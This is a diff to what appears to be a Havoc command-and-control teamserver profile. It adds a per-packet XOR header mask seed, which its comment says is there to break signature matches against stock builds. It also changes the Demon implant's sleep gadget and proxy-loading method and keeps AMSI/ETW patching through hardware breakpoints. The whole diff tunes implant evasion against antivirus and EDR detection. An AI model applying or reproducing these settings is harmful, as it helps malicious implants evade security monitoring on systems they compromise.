@@ -2,6 +2,14 @@ Teamserver {
     Host = "0.0.0.0"
     Port = 40056
 
+    # [HVC-003] Per-packet XOR mask seed for outer header obfuscation. Optional.
+    # Accepts hex ("0x...") or decimal. Must fit in 32 bits and be non-zero.
+    # Default if omitted: 0xA3F1C2B4. Same value is propagated to every Demon
+    # payload built by this teamserver via -DHEADER_MASK_SEED=... so wire format
+    # round-trips. Change this to break signature matches against stock builds.
+    # Value must be 8 characters after 0x..
+    HeaderMaskSeed = "0x344cfbca"
+
     Build {
         Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
         Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
@@ -36,10 +44,10 @@ Demon {
     SleepTechnique = "Ekko"
 
     # Accepted: "None", "jmp rax", "jmp rbx" (only applies to Ekko/Zilean)
-    SleepJmpGadget = "None"
+    SleepJmpGadget = "jmp rbx"
 
     # Accepted: "None (LdrLoadDll)", "RtlRegisterWait", "RtlCreateTimer", "RtlQueueWorkItem"
-    ProxyLoading = "None (LdrLoadDll)"
+    ProxyLoading = "RtlQueueWorkItem"
 
     # Accepted: "None", "HWBP", "Hardware breakpoints"
     AmsiEtwPatching = "HWBP"
